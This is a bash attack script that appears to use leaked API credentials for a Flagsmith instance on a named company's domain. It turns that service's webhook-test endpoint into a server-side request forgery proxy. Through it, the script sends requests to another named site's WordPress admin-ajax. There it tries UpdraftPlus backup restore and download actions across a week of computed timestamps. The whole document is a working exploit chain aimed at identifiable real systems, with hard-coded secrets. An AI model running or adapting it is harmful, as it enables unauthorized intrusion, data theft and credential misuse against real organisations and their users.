#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="9692f91786d55541229bbaa0b35a456befdfe235"
EKEY="TMsg5bGmM7B5duV3Uma7jZ"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test different UpdraftPlus backup timestamps
# Generate timestamps for midnight UTC last 7 days
for day in $(seq 1 7); do
  ts=$(python3 -c "import datetime,time; d=datetime.datetime(2026,11,16-$day,0,0,0); print(int(time.mktime(d.timetuple())))")
  echo -n "TS $ts (Nov $((16-day))) -> "
  SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=${ts}&updraft_restore[]=plugins"
  echo ""
done

# Also test the updraft_download_backup action (might leak info about backup existence)
echo "=== DOWNLOAD BACKUP ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_download_backup&type=plugins&timestamp=1794700800"
echo ""
